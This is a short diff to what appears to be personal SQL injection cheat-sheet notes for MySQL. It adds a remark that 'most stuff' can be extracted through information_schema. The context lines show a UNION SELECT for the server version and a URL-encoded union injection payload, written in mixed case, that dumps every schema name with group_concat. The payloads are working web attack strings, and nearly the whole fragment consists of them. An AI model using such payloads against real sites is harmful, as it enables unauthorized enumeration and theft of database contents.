@@ -14,6 +14,8 @@
 
 #### MySQL
 
+we can extract most stuff here using information_schema
+
 for version => @@VERSION => union select (@@VERSION)
 
 search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,schema_name,0x7c))+from+information_schema.schemata+--+-
